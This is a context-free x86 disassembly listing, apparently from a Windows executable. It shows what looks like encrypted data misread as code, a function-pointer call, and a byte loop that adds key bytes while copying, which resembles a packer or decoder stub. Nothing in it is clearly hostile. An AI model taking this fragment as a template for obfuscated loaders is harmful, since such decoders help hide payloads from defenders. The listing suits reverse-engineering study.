  4168fc:	jl     0x41696c
  4168fe:	dec    edi
  4168ff:	ficom  WORD PTR [esi+0x51]
  416902:	xor    al,0x4d
  416904:	or     edx,edi
  416906:	mov    es,WORD PTR [edi]
  416908:	imul   esi,DWORD PTR [ebx-0x2a],0x5125f09d
  41690f:	loopne 0x41693a
  416911:	push   es
  416912:	mov    dl,0x70
  416914:	mov    DWORD PTR [eax-0x1153c0b7],esi
  41691a:	and    DWORD PTR [edi+0xe96a087],esp
  416920:	fs (bad) 
  416922:	xchg   DWORD PTR [edx+edx*2+0x25],ecx
  416926:	div    DWORD PTR [edi-0x4418b80b]
  41692c:	into   
  41692d:	ja     0x4168d8
  41692f:	push   edx
  416930:	xor    DWORD PTR [eax+esi*4-0x66806741],esi
  416937:	add    bl,BYTE PTR [ebp+eax*8-0xe]
  41693b:	stos   BYTE PTR es:[edi],al
  41693c:	ja     0x416928
  41693e:	mov    esi,DWORD PTR [ebp-0x4]
  416941:	call   esi
  416943:	mov    DWORD PTR [ebp-0x38],eax
  416946:	cmp    DWORD PTR [ebp-0x38],0x57
  41694a:	jne    0x416958
  41694c:	mov    edx,DWORD PTR [ebp-0x20]
  41694f:	push   edx
  416950:	call   0x401000
  416955:	add    esp,0x4
  416958:	xor    eax,eax
  41695a:	pop    esi
  41695b:	mov    esp,ebp
  41695d:	pop    ebp
  41695e:	ret    
  41695f:	push   ebp
  416960:	mov    ebp,esp
  416962:	sub    esp,0x124
  416968:	xor    eax,eax
  41696a:	mov    esp,ebp
  41696c:	pop    ebp
  41696d:	ret    
  41696e:	push   ebp
  41696f:	mov    ebp,esp
  416971:	sub    esp,0x2c
  416974:	push   ebx
  416975:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41697c:	mov    DWORD PTR [ebp-0xc],0x0
  416983:	mov    DWORD PTR [ebp-0x20],0x1
  41698a:	mov    DWORD PTR [ebp-0x10],0x0
  416991:	mov    eax,DWORD PTR [ebp+0xc]
  416994:	mov    DWORD PTR [ebp-0x1c],eax
  416997:	mov    DWORD PTR [ebp-0x18],0x0
  41699e:	mov    DWORD PTR [ebp-0x8],0x0
  4169a5:	mov    DWORD PTR [ebp-0x24],0x0
  4169ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4169af:	sub    ecx,0x1
  4169b2:	mov    DWORD PTR [ebp-0x4],ecx
  4169b5:	mov    edx,DWORD PTR [ebp+0x8]
  4169b8:	mov    DWORD PTR [ebp-0x10],edx
  4169bb:	mov    DWORD PTR [ebp-0x28],0x1
  4169c2:	mov    eax,DWORD PTR [ebp-0x4]
  4169c5:	add    eax,0x2
  4169c8:	mov    DWORD PTR [ebp-0x4],eax
  4169cb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4169ce:	add    ecx,DWORD PTR [ebp-0x4]
  4169d1:	mov    dl,BYTE PTR [ecx+0x1]
  4169d4:	mov    BYTE PTR [ebp-0x11],dl
  4169d7:	mov    eax,DWORD PTR [ebp-0x4]
  4169da:	add    eax,0x1
  4169dd:	mov    DWORD PTR [ebp-0x4],eax
  4169e0:	mov    cl,BYTE PTR [ebp-0x11]
  4169e3:	mov    BYTE PTR [ebp-0x29],cl
  4169e6:	push   edx
  4169e7:	pop    ebx
  4169e8:	mov    ecx,ebx
  4169ea:	mov    edx,DWORD PTR [ebp-0x10]
  4169ed:	add    edx,DWORD PTR [ebp-0x4]
  4169f0:	mov    al,BYTE PTR [ebp-0x29]
  4169f3:	mov    BYTE PTR [edx],al
  4169f5:	mov    ebx,esi
  4169f7:	mov    ecx,DWORD PTR [ebp+0x14]
  4169fa:	add    ecx,DWORD PTR [ebp-0x8]
  4169fd:	movzx  edx,BYTE PTR [ecx]
  416a00:	mov    DWORD PTR [ebp-0xc],edx
  416a03:	mov    eax,DWORD PTR [ebp-0x8]
  416a06:	mov    ecx,DWORD PTR [ebp-0x28]
  416a09:	add    eax,ecx
  416a0b:	mov    DWORD PTR [ebp-0x8],eax
  416a0e:	mov    eax,DWORD PTR [ebp-0x8]
  416a11:	shr    eax,0x3
  416a14:	mov    ecx,0x1
  416a19:	sub    ecx,eax
  416a1b:	mov    DWORD PTR [ebp-0x20],ecx
  416a1e:	shr    eax,cl
  416a20:	mov    edx,DWORD PTR [ebp-0x8]
  416a23:	imul   edx,DWORD PTR [ebp-0x20]
  416a27:	mov    DWORD PTR [ebp-0x8],edx
  416a2a:	shl    ebx,0x3
  416a2d:	mov    eax,DWORD PTR [ebp-0x10]
  416a30:	add    eax,DWORD PTR [ebp-0x4]
  416a33:	movzx  ecx,BYTE PTR [eax]
  416a36:	add    ecx,DWORD PTR [ebp-0xc]
  416a39:	mov    edx,DWORD PTR [ebp-0x10]
  416a3c:	add    edx,DWORD PTR [ebp-0x4]
  416a3f:	mov    BYTE PTR [edx],cl
  416a41:	mov    eax,DWORD PTR [ebp-0x4]
  416a44:	sub    eax,0x2
  416a47:	mov    DWORD PTR [ebp-0x4],eax
  416a4a:	mov    ecx,DWORD PTR [ebp-0x4]
  416a4d:	cmp    ecx,DWORD PTR [ebp+0x10]
  416a50:	jl     0x4169c2
  416a56:	pop    ebx
  416a57:	mov    esp,ebp
  416a59:	pop    ebp
  416a5a:	ret    
  416a5b:	int3   
  416a5c:	jmp    DWORD PTR ds:0x417008
